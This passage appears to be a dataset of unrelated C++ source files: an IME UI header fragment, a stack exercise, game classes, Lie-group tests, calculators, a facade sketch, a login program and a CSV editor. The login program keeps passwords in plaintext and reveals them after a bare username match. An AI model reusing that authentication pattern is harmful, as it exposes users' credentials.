OfficeXP\n#define IMEID_CHS_VER41\t( LANG_CHS | MAKEIMEVERSION( 4, 1 ) )\t// MSPY1.5\t// SCIME97 or MSPY1.5 (w/Win98, Office97)\n#define IMEID_CHS_VER42\t( LANG_CHS | MAKEIMEVERSION( 4, 2 ) )\t// MSPY2\t// Win2k/WinME\n#define IMEID_CHS_VER53\t( LANG_CHS | MAKEIMEVERSION( 5, 3 ) )\t// MSPY3\t// WinXP\n\nstatic const CHAR signature[] = \"%%%IMEUILIB:070111%%%\";\n\nstatic IMEUI_APPEARANCE         gSkinIME =\n{\n    0,\t\t\t// symbolColor;\n    0x404040,   // symbolColorOff;\n    0xff000000,\t// symbolColorText;\n    24,\t\t\t// symbolHeight;\n    0xa0,\t\t// symbolTranslucence;\n    0,\t\t\t// symbolPlacement;\n    nullptr,\t// symbolFont;\n    0xffffffff,\t// candColorBase;\n    0xff000000,\t// candColorBorder;\n    0,\t\t\t// candColorText;\n    0x00ffff00,\t// compColorInput;\n    0x000000ff,\t// compColorTargetConv;\n    0x0000ff00,\t// compColorConverted;\n    0x00ff0000,\t// compColorTargetNotConv;\n    0x00ff0000,\t// compColorInputErr;\n    0x80,\t\t// compTranslucence;\n    0,\t\t\t// compColorText;\n    2,\t\t\t// caretWidth;\n    1,\t\t\t// caretYMargin;\n};\n\nstruct _SkinCompStr\n{\n    DWORD colorInput;\n    DWORD colorTargetConv;\n    DWORD colorConverted;\n    DWORD colorTargetNotConv;\n    DWORD colorInputErr;\n};\n\n_SkinCompStr                    gSkinCompStr;\n\n// Definition from Win98DDK version of IMM.H\ntypedef struct\ntagINPUTCONTEXT2\n{\n    HWND hWnd;\n    BOOL fOpen;\n    POINT ptStatusWndPos;\n    POINT ptSoftKbdPos;\n    DWORD fdwConversion;\n    DWORD fdwSentence;\n    union\n    {\n        LOGFONTA A;\n        LOGFONTW W;\n    } lfFont;\n    COMPOSITIONFORM cfCompForm;\n    CANDIDATEFORM cfCandForm[4];\n    HIMCC hCompStr;\n    HIMCC hCandInfo;\n    HIMCC hGuideLine;\n    HIMCC hPrivate;\n    DWORD dwNumMsgBuf;\n    HIMCC hMsgBuf;\n    DWORD fdwInit;\n    DWORD dwReserve[3];\n}\nINPUTCONTEXT2, *PINPUTCONTEXT2, NEAR *NPINPUTCONTEXT2,\nFAR*                            LPINPUTCONTEXT2;\n\n\n// Class to disable Cicero in case ImmDisableTextFrameService() doesn't disable it completely\nclass CDisableCicero\n{\npublic:\n    CDisableCicero() noexcept :\n        m_ptim( nullptr ),\n        m_bComInit( false )\n    {}\n    ~CDisableCicero()\n    {\n        Uninitialize();\n    }\n\n    void    Initialize()\n    {\n        if( m_bComInit )\n        {\n            return;\n        }\n        H",
    "\ufeff/*De\u0161imtainio skai\u010diaus vertimas i dvejetaine panaudojant stek\u0105.\r\nSpendimo algoritmo \u017eingsniai:\r\na) Nuskaitome sveik\u0105j\u012f de\u0161imtain\u012f skai\u010di\u0173.\r\nb) Sukuriame steko duomen\u0173 strukt\u016br\u0105.\r\nc) Dedame sveik\u0105j\u012f de\u0161imtaini skai\u010di\u0173 i cikl\u0105 ir vykdome cikle tokius veiksmus, kol m\u016bs\u0173 skai\u010dius bus nelygus nuliui:\r\n- Daliname skai\u010di\u0173 i\u0161 2 ir i\u0161saugome liekan\u0105 (% operacija).\r\n- Dedame liekan\u0105 \u012f stek\u0105 (push operacija).\r\n- Dalmen\u012f priskiriame skai\u010diui ir kartojame cikl\u0105 (/, t. y. sveikaskaitin\u0117 dalyba).\r\nd) Apra\u0161ome cikl\u0105, kurio operatoriai paima po vien\u0105 element\u0105 i\u0161 steko ir atspausdina galutin\u012f dvejetaini skai\u010di\u0173 (pop operacija).*/\r\n\r\n#include <iostream>\r\nusing namespace std;\r\n\r\n// Steko klas\u0117s apra\u0161ymas\r\n#define DEFAULT_SIZE 10\r\n\r\nclass Stack {\r\nprivate:\r\n    int size;   // Steko dydis\r\n    int top;    // Vir\u0161utinio elemento indeksas\r\n    int* values; // Dinaminis masyvas steko elementams saugoti\r\n\r\npublic:\r\n    // Konstruktorius\r\n    Stack(int size = DEFAULT_SIZE) : size(size), top(-1) {\r\n        values = new int[size];  // Sukuriame dinamin\u012f masyv\u0105\r\n    }\r\n\r\n    // Destruktorius\r\n    ~Stack() {\r\n        delete[] values;  // I\u0161laisviname dinamin\u0119 atmint\u012f\r\n    }\r\n\r\n    // Patikriname, ar stekas pilnas\r\n    bool isFull() {\r\n        return top == size - 1;\r\n    }\r\n\r\n    // Patikriname, ar stekas tu\u0161\u010dias\r\n    bool isEmpty() {\r\n        return top == -1;\r\n    }\r\n\r\n    // \u012ed\u0117ti element\u0105 \u012f stek\u0105\r\n    void push(int x) {\r\n        if (!isFull()) {\r\n            top++;\r\n            values[top] = x;\r\n        }\r\n        else {\r\n            cout << \"Stekas pilnas, negalima prid\u0117ti elemento!\" << endl;\r\n        }\r\n    }\r\n\r\n    // I\u0161imti element\u0105 i\u0161 steko\r\n    int pop() {\r\n        if (!isEmpty()) {\r\n            return values[top--];\r\n        }\r\n        else {\r\n            cout << \"Stekas tu\u0161\u010dias, n\u0117ra k\u0105 i\u0161imti!\" << endl;\r\n            return -1; // Indikuojame klaid\u0105, jei stekas tu\u0161\u010dias\r\n        }\r\n    }\r\n};\r\n\r\n// Funkcija de\u0161imtainio skai\u010diaus vertimui \u012f dvejetain\u012f, naudojant stek\u0105\r\nvoid decimalToBinary(int number) {\r\n    Stack stack;  // Sukuriame steko objekt\u0105 su numatytuoju dyd\u017eiu\r\n\r\n    // \u012ed\u0117ti liekanas \u012f stek\u0105\r\n    while (number > 0) {\r\n        int remainder = number % 2;\r\n        stack.push(remainder);  // Dedame liekan\u0105 \u012f stek\u0105\r\n        number /= 2;  // Daliname skai\u010di\u0173 i\u0161 2\r\n    }\r\n\r\n    // I\u0161imame ir atspausdiname elementus i\u0161 steko\r\n    cout << \"Dvejetainis skai\u010dius: \";\r\n    while (!stack.isEmpty()) {\r\n        cout << stack.pop();\r\n    }\r\n    cout << endl;\r\n}\r\n\r\nint main() {\r\n    int number;\r\n    cout << \"\u012eveskite sveik\u0105j\u012f de\u0161imtain\u012f skai\u010di\u0173: \";\r\n    cin >> number;\r\n\r\n    if (number >= 0) {\r\n        decimalToBinary(number);  // Konvertuojame de\u0161imtain\u012f skai\u010di\u0173 \u012f dvejetain\u012f\r\n    }\r\n    else {\r\n        cout << \"Skai\u010dius turi b\u016bti teigiamas.\" << endl;\r\n    }\r\n\r\n    return 0;\r\n}\r\n",
    "#include \"Fase.hpp\"\r\n\r\nFase::Fase(const Fase &f) : name(f.name)\r\n{\r\n\tbackground = f.background->copia();\r\n\t\r\n\tfor (auto it = f.objs.begin() ; it != f.objs.end() ; ++it)\r\n\t\tthis->objs.push_back( new ObjetoDeJogo(**it) );\r\n}\r\n\r\nconst Fase &Fase::operator=(const Fase &f)\r\n{\r\n\tif (this != &f)\r\n\t{\r\n\t\tthis->name = f.name;\r\n\t\t\r\n\t\tdelete this->background;\r\n\t\t//trick\r\n\t\tbackground = f.background->copia();\r\n\t\t\r\n\t\tfor (auto it = this->objs.begin() ; it != this->objs.end() ; ++it)\r\n\t\t\tdelete *it;\r\n\t\t\t\r\n\t\tthis->objs.clear();\r\n\t\t\r\n\t\tfor (auto it = f.objs.begin() ; it != f.objs.end() ; ++it)\r\n\t\t\tthis->objs.push_back( new ObjetoDeJogo(**it) );\r\n\t\t\r\n\t}\r\n\t\r\n\treturn *this;\r\n}\r\n\r\nFase::~Fase()\r\n{\r\n\tdelete background;\r\n\tfor (auto it = objs.begin() ; it != objs.end() ; ++it)\r\n\t\tdelete (*it);\r\n}\r\n\r\nvoid Fase::update()\r\n{\r\n\tbackground->update();\r\n\t\r\n\tfor (auto it = objs.begin() ; it != objs.end() ; ++it)\r\n\t\t(*it)->update();\r\n}\r\n\r\nvoid Fase::draw(SpriteBase &screen, int x, int y)\r\n{\r\n\tbackground->draw(screen,0,0);\r\n\tfor (auto it = objs.begin() ; it != objs.end() ; ++it)\r\n\t\t(*it)->draw(screen,(*it)->getPosL(),(*it)->getPosC());\r\n}\r\n",
    "#include <gtest/gtest.h>\n#include <iostream>\n#include <liegroups/liegroups.hpp>\n#include <unsupported/Eigen/MatrixFunctions>\n\nusing namespace LieGroups;\n\n// basic assertion\nTEST(LieGroupsTest, BasicAssertions) {\n  EXPECT_STRNE(\"hello\", \"world\");\n  EXPECT_EQ(7 * 6, 42);\n}\n\n// Exp(zero) == Identity\nTEST(LieGroupsTest, ExpZeroSO3) {\n  Vector3f v = Vector3f::Zero();\n  Matrix3f R = SO3::Exp(v);\n  EXPECT_EQ(R, Matrix3f::Identity());\n}\n\nTEST(LieGroupsTest, ExpZeroSE3) {\n  Vector6f v = Vector6f::Zero();\n  Matrix4f T = SE3::Exp(v);\n  EXPECT_EQ(T, Matrix4f::Identity());\n}\n\n// Log(Identity) == Zero\nTEST(LieGroupsTest, LogIdentity) {\n  Matrix3f R = SO3::Identity<float>();\n  Vector3f v = SO3::Log(R);\n  EXPECT_EQ(v, Vector3f::Zero());\n}\n\nTEST(LieGroupsTest, LogIdentitySE3) {\n  Matrix4f T = SE3::Identity<float>();\n  Vector6f v = SE3::Log(T);\n  EXPECT_EQ(v, Vector6f::Zero());\n}\n\n// Exp and Log are inverses\nTEST(LieGroupsTest, ExpLogSO3) {\n  // use a fixed seed;\n  srand(0);\n\n  for (int i = 0; i < 100; i++) {\n    Vector3f tau = Vector3f::Random();\n    Matrix3f R = SO3::Exp(tau);\n    EXPECT_NEAR((SO3::Log(R) - tau).norm(), 0, 1e-6);\n  }\n}\n\n// Exp and Log are inverses\nTEST(LieGroupsTest, ExpLogSE3) {\n  // use a fixed seed;\n  srand(0);\n\n  for (int i = 0; i < 100; i++) {\n    Vector6f tau = Vector6f::Random();\n    Matrix4f T = SE3::Exp(tau);\n    EXPECT_NEAR((SE3::Log(T) - tau).norm(), 0, 1e-6);\n  }\n}\n\nTEST(LieGroupsTest, HatVeeSO3) {\n  srand(0);\n  for (int i = 0; i < 100; ++i) {\n    Vector3f v = Vector3f::Random();\n    Matrix3f tau = SO3::hat(v);\n    Vector3f v2 = SO3::vee(tau);\n    EXPECT_NEAR((v2 - v).norm(), 0, 1e-6);\n  }\n}\n\nTEST(LieGroupsTest, HatVeeSE3) {\n  srand(0);\n  for (int i = 0; i < 100; ++i) {\n    Vector6f v = Vector6f::Random();\n    Matrix4f tau = SE3::hat(v);\n    Vector6f v2 = SE3::vee(tau);\n    EXPECT_NEAR((v2 - v).norm(), 0, 1e-6);\n  }\n}\n\nTEST(LieGroupsTest, ExpIsMatrixExpSO3) {\n  // use a fixed seed\n  srand(0);\n\n  for (int i = 0; i < 100; i++) {\n    Vector3f v = Vector3f::Random();\n    Matrix3f tau = SO3::hat(v);  // get the element of the lie algebra\n    Matrix3f T = SO3::Exp(v);\n\n    Matrix3f T2 = tau.exp();\n\n    EXPECT_NEAR((T2 - T).norm(), 0, 1e-6);\n  }\n}\n\nTEST(LieGroupsTest, ExpIsMatrixExpSE3) {\n  // use a fixed seed\n  srand(0);\n\n  for (int i = 0; i < 100; i++) {\n    Vector6f v = Vector6f::Random();\n    Matrix4f tau = SE3::hat(v);  // get the element of the lie algebra\n    Matrix4f T = SE3::Exp(v);\n\n    Matrix4f T2 = tau.exp();\n\n    EXPECT_NEAR((T2 - T).norm(), 0, 1e-6);\n  }\n}\n",
    "#include <iostream>\n\ndouble add(double a, double b) {\n    return a + b;\n}\n\ndouble sub(double a, double b) {\n    return a - b;\n}\n\ndouble multiply(double a, double b) {\n    return a * b;\n}\n\ndouble divide(double a, double b) {\n    return a / b;\n}\n\nint main() {\n    std::cout << \"Enter the first operand: \";\n    double a, b;\n    int d;\n    std::cin >> a;\n    std::cout << \"Enter the second operand: \";\n    std::cin >> b;\n    std::cout << \"Enter the operator (1-4):\\n\";\n    std::cout << \"1 for add\\n2 for sub\\n3 for multiply\\n4 for division\\n\";\n    std::cin >> d;\n\n    double result;\n\n    switch(d) {\n        case 1:\n            result = add(a, b);\n            break;\n        case 2:\n            result = sub(a, b);\n            break;\n        case 3:\n            result = multiply(a, b);\n            break;\n        case 4:\n            if (b != 0) {\n                result = divide(a, b);\n            } else {\n                std::cout << \"Division by zero is not allowed.\\n\";\n                return 1; // Exit the program if division by zero is attempted\n            }\n            break;\n        default:\n            std::cout << \"Enter a valid choice from 1-4\\n\";\n            return 1; // Exit the program if an invalid choice is entered\n    }\n\n    std::cout << \"The result is: \" << result << std::endl;\n\n    return 0;\n}\n",
    "#include <iostream>\n#include <iomanip> //setprecision and fixed manipulators\n\n#define SUBCHARGE_RATE 0.05 \n#define TAX_RATE 0.0875\n\nvoid input_recieve(double& subtotal);\nvoid caculate_subcharge(double subtotal, double& subcharge);\nvoid caculate_tax(double subtotal, double subcharge, double& tax);\nvoid caculate_total(double subtotal, double subcharge, double tax, double& total);\nvoid print_bill(double subtotal, double subcharge, double tax, double total);\n\nint main() {\n\tstd::cout << std::fixed << std::setprecision(2);\n\tdouble subtotal, subcharge, tax, total;\n\tinput_recieve(subtotal);\n\tcaculate_subcharge(subtotal, subcharge);\n\tcaculate_tax(subtotal, subcharge, tax);\n\tcaculate_total(subtotal, subcharge, tax, total);\n\tprint_bill(subtotal, subcharge, tax, total);\n\t\n}\n\n\n//\n//This module recieve input from user\n//\nvoid input_recieve(double &subtotal) {\n\tstd::cout << \"Enter subtotal: \";\n\tstd::cin >> subtotal;\n\t//this loop will validate input, if user dont enter a number, ask user reenter\n\twhile (true) {\n\t\t//check if input operation failed\n\t\tif (std::cin.fail()) { //if fail\n\t\t\tstd::cin.clear();// Clear the error flags on the input stream.\n\t\t\tstd::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n'); // leave the rest of the line or clear buffer line\n\t\t\tstd::cout << \"Please enter a number: \"; //ask user enter new value\n\t\t\tstd::cin >> subtotal;\n\t\t}\n\t\telse {\n\t\t\tbreak;\n\t\t}\n\t}\n}\n\n\n//\n//this module caculate the subchager\n//\nvoid caculate_subcharge(double subtotal, double &subcharge) {\n\tsubcharge = subtotal * SUBCHARGE_RATE;\n}\n\n\n//\n//this module caculate tax of subtotal +subcharge\n//\nvoid caculate_tax(double subtotal, double subcharge, double& tax) {\n\ttax = (subcharge + subtotal) * TAX_RATE;\n}\n\n\n//\n//this module caculate total bill\n//\nvoid caculate_total(double subtotal, double subcharge, double tax, double& total) {\n\ttotal = subcharge + subtotal + tax;\n}\n\n\n//\n//this module print out the bill\n//\nvoid print_bill(double subtotal, double subcharge, double tax, double total) {\n\tstd::cout << \"Subtotal: $\" << subtotal << std::endl;\n\tstd::cout << \"Lingving Wage Subcharge(5.00%): $\" << subcharge << std::endl;\n\tstd::cout << \"Tax(8.75%): $\" << tax << std::endl;\n\tstd::cout << \"Total: $\" << total << std::endl;\n}\n",
    "#include <iostream>\n#include <string>     \nusing namespace std;                \n\n// Let us have very complicated class structure for rendering the scene\n\nclass _3DSceneLoader\n{\n  //<...>\n};\n\nclass _2DTextureReader\n{\n  //<...>\n};\n\nclass Projector\n{\n  //<...>\n};\n\nclass Rasterizator\n{\n  //<...>\n};\n\nclass ImageSaver\n{\n  //<...>\n};\n\n/* And instead letting it as it is right now, we can offer a high-level class\nthat is easy to use without understanding the guts of this library */\n\nclass Facade\n{\n    private:\n        _3DSceneLoader *sceneLoader;\n        _2DTextureReader *textureReader;\n        Projector *projector;\n        Rasterizator *rasterizator;\n        ImageSaver *imageSaver;\n    //<...>\n    public:\n        // Encapsulate whole rendering pipeline here\n        void RenderTheScene(string inputFilename, string outputFilename) \n        {\n            _3DScene scene = sceneLoader->loadMainSceneFile(inputFilename);\n            TexturesMap texturesMap = textureReader->openTextures(scene.getTexturesList());\n            Camera viewPoint = scene.getCamera();\n            //<...>\n            imageSaver->save(outputFilename);\n        }\n}\n",
    "#include<iostream>\r\n#include<fstream>\r\n#include<string.h>\r\n#include<windows.h>\r\n#include<graphics.h>\r\nusing namespace std;\r\n\r\n\tvoid Login();\r\n\tvoid Registration();\r\n\tvoid Forgot();\r\n\t\r\nvoid setcolor(int color) {\r\n    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE); // Get console handle\r\n    SetConsoleTextAttribute(hConsole, color); // Set text color\r\n}\r\nint main()\r\n{\r\n\tint c;\r\n\tchar n;\t\t//c for choice\r\n\t\r\n\tsetcolor(2);\r\n\tcout<<\"\\n\\n\\n\";\r\n\tcout<<\"\\t\\t\\t\\t__________________________________________________________\\n\\n\";\r\n\tcout<<\"\\t\\t\\t\\t|                    \tWELCOME                         |\\n\\n\";\r\n\tcout<<\"\\t\\t\\t\\t|                    \t   TO                           |\\n\\n\";\r\n\tcout<<\"\\t\\t\\t\\t|                    \t LOGIN                          |\\n\\n\";\r\n\tcout<<\"\\t\\t\\t\\t|                    \t   &                            |\\n\\n\";\r\n\tcout<<\"\\t\\t\\t\\t|                    REGISTRATION                       |\\n\\n\";\r\n\tcout<<\"\\t\\t\\t\\t|                    \t  MENU                          |\\n\\n\";\r\n\tcout<<\"\\t\\t\\t\\t|_______________________________________________________|\\n\\n\";\r\n\tsetcolor(3);\r\n\t\r\n\tcout<<\"\\t\\t\\t\\t\\t\\t\\t\\t\\t Enter anything to go next : \";\r\n\tsetcolor(4);\r\n\tcin>>n;\r\n\t\r\n\tsystem(\"cls\");\r\n\tsetcolor(3);\r\n\tcout<<\"\\n\\n\\n\";\r\n\tcout << \"\\t\\t\\t|\\t  Press 1 to LOGIN                     \\t|\" <<\"\\n\\n\";\r\n    cout << \"\\t\\t\\t|\\t  Press 2 to REGISTERATION             \\t|\" <<\"\\n\\n\";\r\n    cout << \"\\t\\t\\t|\\t  Press 3 if you forgot your PASSWORD  \\t|\" <<\"\\n\\n\";\r\n    cout<<  \"\\t\\t\\t|\\t  press 4 to go in MENU \\n\\n\\n         \\t|\" <<\"\\n\\n\";\r\n\tcout << \"\\n\\n\\t\\t \\t  Please enter your choice : \";\r\n    setcolor(4);\r\n    cin >> c;\r\n    cout <<\"\\n\\n\";\r\n    switch(c)\r\n    {\r\n    \tcase 1:\r\n    \t\tLogin();\r\n    \t\tbreak;\r\n    \tcase 2:\r\n\t\t     Registration();\r\n\t\t\t break;\r\n\t\tcase 3:\r\n\t\t     Forgot();\r\n\t\t\t break;\t \t\r\n\t\t\t case 4:\r\n\t\t\t \tsystem(\"cls\");\r\n\t\t\t \tmain();\r\n\t\t\t \tbreak;\r\n    \tdefault:\r\n    \t\tsystem(\"cls\");\r\n    \t\tsetcolor(4);\r\n            cout<<\"\\t\\t Invalid Selection...!\\n\";\r\n            cout<<\"\\t\\t please select the correct option...!\\n\";\r\n            main();\r\n    \r\n\t}\r\n}\r\nvoid Login()\r\n{\r\n\tint count;\r\n\tstring userid,password,id,pass;\r\n\tsystem(\"cls\");\r\n\tsetcolor(13);\r\n\tcout<<\"\\t\\t_____________LOGIN____________\\n\\n\";\r\n\tcout<<\"\\t\\t Enter the USERNAME & PASSWORD :\\n\\n\";\r\n\tcout<<\"\\t\\t\\t USERNAME : \";\r\n\tcin>>userid;\r\n\tcout<<\"\\n\\t\\t\\t PASSWORD : \";\r\n\tcin>>password;\r\n\tifstream input(\"records.txt\");\r\n\twhile(input>>id>>pass)\r\n\t{\r\n\t\tif(id==userid && pass==password)\r\n\t{\r\n\t\tcount=1;\r\n\t}\r\n\t}\r\n\tinput.close();\r\n\tif(count==1)\r\n\t{\r\n\t\tsystem(\"cls\");\r\n\t\tsetcolor(4);\r\n\t\tcout<<\"\\n\\t\\t LOGIN  successfull \\n\";\r\n\t\tmain();\r\n\t}\r\n\telse\r\n\t{\r\n\t\tsystem(\"cls\");\r\n\t\tsetcolor(4);\r\n\t\tcout<<\"\\n LOGIN ERROR \\n please check your userid and password\\n\";\r\n\t\tmain();\r\n\t}\r\n}\r\nvoid Registration()\r\n{\r\n\tstring ruserid, rpassword, rid, rpass;\r\n    system(\"cls\");\r\n    setcolor(14);\r\n    cout << \"\\t\\t\\t Enter the username : \";\r\n    cin >> ruserid;\r\n    cout << \"\\n\\t\\t\\t Enter the password : \";\r\n    cin >> rpassword;\r\n\tofstream f1(\"records.txt\",ios::app);\r\n\tf1 << ruserid << \" \" << rpassword << endl;\r\n    system(\"cls\");\r\n    setcolor(4);\r\n    cout << \"\\n\\t\\t\\t Registrationis succesfull! \\n\";\r\n    main();\r\n}\r\nvoid Forgot()\r\n{\r\n\tint option;\r\n    system(\"cls\");\r\n    setcolor(11);\r\n    cout << \"\\t\\t\\t You forgot the password? No Worries \\n\\n\";\r\n    cout << \"Press 1 to search your id by username \" << endl;\r\n    cout << \"press 2 to go to the main menu \" << endl;\r\n    cout << \"\\t\\t\\t Enter your choice :\";\r\n    setcolor(4);\r\n    cin >> option;\r\n    switch (option)\r\n    {\r\n    case 1:\r\n    {\r\n\t\r\n    \t\r\n        int count = 0;\r\n        string suserid, sid, spass;\r\n        \r\n        setcolor(9);\r\n        cout << \"\\n\\t\\t\\t Enter the userid which you remembered :\";\r\n        setcolor(4);\r\n        cin >> suserid;\r\n\r\n        ifstream f2(\"records.txt\");\r\n        while (f2>>sid>>spass)\r\n        {\r\n            if (sid==suserid)\r\n            {\r\n                count =1;\r\n            }\r\n        }\r\n        f2.close();\r\n        \r\n        if(count==1)\r\n        {\r\n        \tsystem(\"cls\");\r\n        \tsetcolor(4);\r\n            cout << \"\\n\\n Your account is found \\n\\n\";\r\n            cout << \"\\nYour password is :\" << spass;\r\n            main();\r\n    }\r\n        else\r\n        {\r\n\t\tsystem(\"cls\");\r\n            cout << \"\\n\\t Sorry! your account is not found! \\n\";\r\n            main();\r\n    }\r\n\r\n        break;\r\n}\r\n    case 2:\r\n    system(\"cls\");\r\n    main();\r\n    break;\r\n    \r\n    default:\r\n    \t\r\n\t\tsystem(\"cls\");\r\n    \tsetcolor(4);\r\n       cout << \"\\t\\t\\t Wrong choice ! Please try again \" << endl;\r\n     main();\r\n}\r\n}\r\n",
    "#include <iostream>\nusing namespace std;\n\nint main()\n{\n    int Q1, Q2, P1, P2, A, gruz1, gruz2, remains, price, travels2, min_price = __INT_MAX__;\n    cin >> Q1 >> P1 >> Q2 >> P2 >> A;\n    for (int travels1 = 0; travels1 <= ((A + Q1 - 1) / Q1) ; travels1++) // \u0426\u0418\u041a\u041b \u041f\u041e \u041f\u041e\u0415\u0417\u0414\u041a\u0410\u041c \u041e\u0422 0 \u0414\u041e (\u0413\u0420\u0423\u0417 / \u0412\u041c\u0415\u0421\u0422\u0418\u041c\u041e\u0421\u0422\u042c \u0413\u0420\u0423\u0417\u041e\u0412\u0418\u041a\u0410_1 {\u041e\u041a\u0420\u0423\u0413\u041b\u0415\u041d\u0418\u0415 \u0412\u0412\u0415\u0420\u0425})\n    {\n        gruz1 = travels1 * Q1; // \u041f\u0415\u0420\u0412\u042b\u0419 \u0413\u0420\u0423\u0417 = \u041f\u041e\u0415\u0417\u0414\u041a\u0418_1 * \u0422\u041e\u041d\u041d\u042b\n        remains = A - gruz1; // \u041e\u0421\u0422\u0410\u0422\u041e\u041a = \u0412\u0421\u0415\u0413\u041e \u0422\u041e\u041d - \u041f\u0415\u0420\u0412\u042b\u0419 \u0413\u0420\u0423\u0417\n        travels2 = 0;\n        if (remains > 0) // \u0415\u0421\u041b\u0418 \u0415\u0421\u0422\u042c \u0427\u0422\u041e \u0412\u0415\u0417\u0422\u0418\n        {\n            travels2 = ((remains + Q2 - 1) / Q2); // \u041f\u041e\u0415\u0417\u0414\u041a\u0418_2 = (\u0413\u0420\u0423\u0417 / \u0412\u041c\u0415\u0421\u0422\u0418\u041c\u041e\u0421\u0422\u042c \u0413\u0420\u0423\u0417\u041e\u0412\u0418\u041a\u0410_2 {\u041e\u041a\u0420\u0423\u0413\u041b\u0415\u041d\u0418\u0415 \u0412\u0412\u0415\u0420\u0425})\n        }\n        price = travels1 * P1 + travels2 * P2; // \u0418\u0422\u041e\u0413\u041e\u0412\u0410\u042f \u0421\u0422\u041e\u0418\u041c\u041e\u0421\u0422\u042c\n        min_price = min(min_price, price); // \u041c\u0418\u041d\u0418\u041c\u0410\u041b\u042c\u041d\u0410\u042f \u0421\u0422\u041e\u0418\u041c\u041e\u0421\u0422\u042c\n    }\n    cout << min_price << endl;\n    \n\n\n// \u0417\u0430\u0434\u0430\u043d\u0438\u0435 3\n    int const SIZE = 20100;\n    int n, temp1, temp2;\n    cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 n <= 10000: \";\n    cin >> n;\n    int arr[SIZE];\n    for (int i = 0; i < n ; i++)\n    {\n        arr[i] = i + 1;\n    }\n    for (int i = 0 ; i < n; i++)\n    {\n        int num_global = arr[i]; \n        bool flag = true;\n        if (num_global > 9)\n            while (num_global != 0) // \u041f\u0420\u041e\u0412\u0415\u0420\u041a\u0410 \u041d\u0410 \u0420\u0410\u0417\u041b\u0418\u0427\u041d\u041e\u0421\u0422\u042c \u0426\u0418\u0424\u0420 \u0427\u0418\u0421\u041b\u0410\n            {\n                int digit_global = num_global % 10, num_local = num_global / 10; \n                while (num_local != 0)\n                {\n                    int digit_local = num_local % 10; \n                    if (digit_global == digit_local)\n                    {\n                        flag = false;\n                    }\n                    num_local /= 10;    \n                }\n                num_global /= 10;   \n\n            }\n        else \n        {\n            flag = false;\n        }\n\n        int palindrom = 0, number = arr[i];\n        bool flag_palindrom = false;\n\n\n\n        while ((!flag) && (number != 0)) // \u041f\u0420\u041e\u0412\u0415\u0420\u041a\u0410 \u041d\u0410 \u041f\u0410\u041b\u0418\u041d\u0414\u0420\u041e\u041c\n        {\n            palindrom = palindrom * 10 + number % 10;\n            number /= 10;\n        }\n        if (palindrom == arr[i])\n        {\n            flag_palindrom = true;\n        }\n\n\n\n        if (flag) //  \u0423\u0414\u0410\u041b\u0415\u041d\u0418\u0415 \u0427\u0418\u0421\u0415\u041b \u0411\u0415\u0417 \u041e\u0414\u0418\u041d\u0410\u041a\u041e\u0412\u042b\u0425 \u0426\u0418\u0424\u0420\n        {\n            n--;\n            for (int j = i ; j < n ; j++)\n            {\n                arr[j] = arr[j + 1];\n            }\n            i--;\n\n        }\n\n\n\n\n\n        else if (flag_palindrom) // \u0414\u0423\u0411\u041b\u0418\u0420\u041e\u0412\u0410\u041d\u0418\u0415 \u041f\u0410\u041b\u0418\u041d\u0414\u0420\u041e\u041c\u041e\u0412\n        {\n            temp1 = arr[i + 1];\n            arr[i + 1] = arr[i];\n            n++;\n            for (int j = i + 1 ; j < n ; j++)\n            {\n                temp2 = arr[j + 1];\n                arr[j + 1] = temp1;\n                temp1 = temp2;\n            }\n            i++;\n        }\n    }\n    for (int i = 0; i < n ; i++) // \u0412\u042b\u0412\u041e\u0414\n    {\n        cout << arr[i] << ' ';\n    }\n    cout << endl;\n}",
    "#include <iostream>   // Provides input/output functionality.\r\n#include <iomanip>    // Provides formatting tools for output.\r\n#include <fstream>\t\t//Allows reading from and writing to files.\r\n#include <sstream>    //Allows working with strings \r\n#include <limits>  // Include limits for numeric_limits\r\nusing namespace std;\r\n\r\nint main() {\r\n    int check = 1, repeat = 1;\r\n    string name, str;\r\n    int age;\r\n    fstream fin, fout;\r\n\r\n    while (repeat == 1) {\r\n        cout << \"Press 1 to enter data in the record.\" << endl;\r\n        cout << \"Press 2 to delete an entry in the record.\" << endl;\r\n        cout << \"Press 3 to update an entry in the record.\" << endl;\r\n        cout << \"Press 4 to view data.\" << endl;\r\n        cin >> check;\r\n\r\n        // Add data to the file\r\n        if (check == 1) {\r\n            fout.open(\"data.csv\", ios::app);\r\n            if (!fout) {\r\n                cerr << \"Error opening file!\" << endl;\r\n                return 1;\r\n            }\r\n            int repeatInput = 1;\r\n            while (repeatInput == 1) {\r\n                cout << \"Enter name: \";\r\n                cin.ignore();\r\n                getline(cin, name);\r\n                cout << \"Enter age: \";\r\n                cin >> age;\r\n                fout << name << \",\" << age << endl;\r\n                cout << \"To add more data press (1), to exit press any other key: \";\r\n                cin >> repeatInput;\r\n            }\r\n            fout.close();\r\n        }\r\n\r\n        // Delete data from the database\r\n        else if (check == 2) {\r\n            string sname, dname;\r\n            cout << \"Enter the name you want to delete: \";\r\n            cin.ignore();\r\n            getline(cin, dname);\r\n\r\n            fin.open(\"data.csv\", ios::in);\r\n            fout.open(\"data_temp.csv\", ios::out);\r\n\r\n            if (!fin || !fout) {\r\n                cerr << \"Error opening file!\" << endl;\r\n                return 1;\r\n            }\r\n\r\n            while (getline(fin, str)) {\r\n                stringstream ss(str);\r\n                getline(ss, sname, ',');\r\n                getline(ss, str, ',');\r\n                if (sname != dname) {\r\n                    fout << sname << \",\" << str << endl;\r\n                }\r\n            }\r\n\r\n            fin.close();\r\n            fout.close();\r\n            remove(\"data.csv\");\r\n            rename(\"data_temp.csv\", \"data.csv\");\r\n        }\r\n\r\n        // Update data in the database\r\n        else if (check == 3) {\r\n            string uname, updated_name;\r\n            int updated_age;\r\n            cout << \"Enter the name you want to update: \";\r\n            cin.ignore();\r\n            getline(cin, name);\r\n\r\n            fin.open(\"data.csv\", ios::in);\r\n            fout.open(\"data_temp.csv\", ios::out);\r\n\r\n            if (!fin || !fout) {\r\n                cerr << \"Error opening file!\" << endl;\r\n                return 1;\r\n            }\r\n\r\n            while (getline(fin, str)) {\r\n                stringstream ss(str);\r\n                getline(ss, uname, ',');\r\n                getline(ss, str, ',');\r\n                if (uname == name) {\r\n                    cout << \"Enter new name: \";\r\n                    getline(cin, updated_name);\r\n                    cout << \"Enter new age: \";\r\n                    cin >> updated_age;\r\n                    fout << updated_name << \",\" << updated_age << endl;\r\n                } else {\r\n                    fout << uname << \",\" << str << endl;\r\n                }\r\n            }\r\n\r\n            fin.close();\r\n            